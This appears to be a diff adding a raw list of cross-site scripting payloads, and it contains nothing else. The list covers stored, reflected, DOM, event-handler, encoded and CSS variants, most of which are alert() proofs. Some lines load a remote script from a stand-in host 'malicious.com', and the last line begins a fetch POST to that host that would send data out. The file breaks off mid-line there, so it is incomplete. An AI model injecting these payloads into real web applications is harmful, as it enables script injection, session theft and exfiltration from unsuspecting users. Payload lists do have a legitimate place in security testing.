@@ -1,0 +1,72 @@
+<script>alert('Stored XSS');</script>
+<img src=x onerror=alert('Stored XSS');>
+<script>alert('Reflected XSS');</script>
+<img src=x onerror=alert('Reflected XSS');>
+
+<script>alert('Stored XSS')</script>
+<img src="x" onerror="alert('Stored XSS')">
+"><script>alert('Stored XSS')</script>
+<script src="data:text/javascript,alert('Stored XSS')"></script>
+
+<script>alert('Reflected XSS')</script>
+<img src="x" onerror="alert('Reflected XSS')">
+"><script>alert('Reflected XSS')</script>
+<script src="data:text/javascript,alert('Reflected XSS')"></script>
+
+<script>document.location='javascript:alert("DOM-based XSS")'</script>
+"><script>document.location='javascript:alert("DOM-based XSS")'</script>
+<input type="text" value="javascript:alert('DOM-based XSS')">
+
+<img src="x" onmouseover="alert('Event-based XSS')">
+<a href="javascript:alert('Event-based XSS')">Click me</a>
+<input type="text" value="javascript:alert('Event-based XSS')" onfocus="alert('Event-based XSS')">
+
+<a href="javascript:alert('JavaScript URI XSS')">Click me</a>
+<img src="javascript:alert('JavaScript URI XSS')">
+
+<svg/onload=alert('XSS')>
+<iframe src="javascript:alert('XSS')"></iframe>
+<svg><script>alert('XSS')</script></svg>
+
+%3Cscript%3Ealert('Encoded XSS')%3C/script%3E
+%3Cimg%20src%3D%22x%22%20onerror%3D%22alert('Encoded XSS')%22%3E
+
+<script>alert('XSS');</script>
+<img src=x onerror=alert('XSS')>
+<iframe src="javascript:alert('XSS');"></iframe>
+<svg onload="alert('XSS')">
+<body onload=alert('XSS')>
+
+<a href="#" onclick="alert('XSS');">Click me</a>
+<div onmouseover="alert('XSS')">Hover over me</div>
+<input type="text" value="Click <button onclick='alert(1)'>here</button>">
+
+<a href="javascript:alert('XSS')">Click here</a>
+"><script>alert('XSS')</script>
+" onmouseover="alert('XSS')">
+<img src="invalid.jpg" onerror="alert('XSS')">
+
+<input type="text" value="XSS test" onfocus="alert('XSS')">
+<input type="text" value='"><script>alert(1)</script>'>
+
+{"onerror":"alert('XSS')"}
+{"userInput": "<img src=x onerror=alert('XSS')>"}
+
+%27%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
+javascript:alert(String.fromCharCode(88,83,83))
+
+<style>*{background-image: url(javascript:alert('XSS'))}</style>
+<div style="background-color: red; filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='x', sizingMethod='scale');"></div>
+
+<meta http-equiv="refresh" content="0;url=javascript:alert('XSS');">
+<script>document.body.appendChild(document.createElement('script')).src='http://malicious.com/x.js'</script>
+<link rel="stylesheet" href="http://example.com/xss.css" onload="alert('XSS')">
+<audio src="x.mp3" onerror="alert('XSS')"></audio>
+
+<svg><script>alert('XSS')</script></svg>
+<marquee behavior="alternate" onstart="alert('XSS')">Test</marquee>
+# Cookie-based Payloads
+document.cookie = "name=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/; domain=" + window.location.hostname + ";";
+<script>document.cookie="XSS=test";alert(document.cookie)</script>
+
+`<script>fetch('http://malicious.com', {method: 'POST', body: 'payload=' + encodeURIComponent('
